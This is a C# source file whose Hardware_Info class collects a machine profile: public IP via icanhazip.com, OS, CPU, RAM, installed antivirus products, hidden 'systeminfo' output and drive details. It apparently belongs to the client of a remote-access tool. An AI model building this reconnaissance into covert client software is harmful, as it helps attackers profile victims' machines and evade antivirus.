using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management;
using Microsoft.VisualBasic.Devices;
using System.Diagnostics;
using System.IO;
using Newtonsoft.Json;

namespace Client.Utilities
{
    public static class Hardware_Info
    {
        private static string GetIP()
        {
            return Communication.Server.AsyncReadURL("http://icanhazip.com").Result;
        }
        private static string GetCulture()
        {
            return new ComputerInfo().InstalledUICulture.Name;
        }
        private static string GetOSFriendlyName()
        {
            return new ComputerInfo().OSFullName;
        }
        private static string GetProcessorName()
        {
            try
            {
                ManagementObjectSearcher mos = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                foreach (ManagementObject mo in mos.Get())
                {
                    return (string)mo["Name"];
                }
                return System.Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER");
            }
            catch
            {
                return "Unkown";
            }
        }
        private static string GetAVName()
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                ManagementObjectSearcher wmiData = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
                ManagementObjectCollection data = wmiData.Get();
                foreach (ManagementObject virusChecker in data)
                {
                    var virusCheckerName = virusChecker["displayName"];

                    sb.Append(virusCheckerName + ", ");
                }
                return sb.ToString();
            }
            catch { }
            return string.Empty;
        }
        private static string GetTotalRam()
        {
            return Converter.FormatBytes((long)new ComputerInfo().TotalPhysicalMemory);
        }
        private static string RunAndGetSystemInfo()
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                Process p = new Process();
                p.StartInfo = new ProcessStartInfo("systeminfo");
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.UseShellExecute = false;
                DataReceivedEventHandler whenreceived = (s, e) =>
                {

                    if (!string.IsNullOrWhiteSpace(e.Data))
                    {
                        sb.AppendLine(e.Data.Trim());
                    }

                };

                p.OutputDataReceived += whenreceived;
                p.ErrorDataReceived += whenreceived;

                p.EnableRaisingEvents = true;
                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();
                p.WaitForExit();

                return sb.ToString();
            }
            catch (Exception ex)
            {
                return $"Failed Running 'systeminfo' : {ex.ToString()}";
            }
        }
        private static string GetDriveInfos()
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                DriveInfo[] drives = DriveInfo.GetDrives();
                foreach (var drive in drives.Where(x => x.IsReady && (x.DriveType != DriveType.CDRom)))
                {
                    try
                    {
                        sb.AppendLine($"Drive '{drive.Name}' at {drive.RootDirectory}");
                        sb.AppendLine($"\tDrive Volume Label : {drive.VolumeLabel}");
                        sb.AppendLine($"\tDrive Type : {drive.DriveType}");
                        sb.AppendLine($"\tDrive Available Free Space : {Converter.FormatBytes(drive.AvailableFreeSpace)}");
                        sb.AppendLine($"\tDrive Total Free Space : {Converter.FormatBytes(drive.TotalFreeSpace)}");
                        sb.AppendLine($"\tDrive Total Used Space : {Converter.FormatBytes(drive.TotalSize - drive.TotalFreeSpace)}");
                        sb.AppendLine($"\tDrive Total Size : {Converter.FormatBytes(drive.TotalSize)}");
                    }
                    catch (Exception ex)
                    {
                        sb.AppendLine($"Exception occured while reading drive info {ex.ToString()}");
                    }
                }
                return sb.ToString();
            }
            catch (Exception ex)
            {
                return $"Failed Getting Drive Information : {ex.ToString()}";
            }
        }
        public static string ToString()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("==< Machine Information >==");
            sb.AppendLine($"OS Name : {GetOSFriendlyName()}");
            sb.AppendLine($"Processor : {GetProcessorName()}");
            sb.AppendLine($"RAM : {GetTotalRam()}");
            sb.AppendLine($"Culture : {GetCulture()}");
            sb.AppendLine($"Active Antivirus : {GetAVName()}");
            sb.AppendLine("==< SystemInfo Output >==");
            sb.AppendLine(RunAndGetSystemInfo());
            sb.AppendLine("==< Drive Information >==");
            sb.AppendLine(GetDriveInfos());
            return sb.ToString();
        }
    }
}
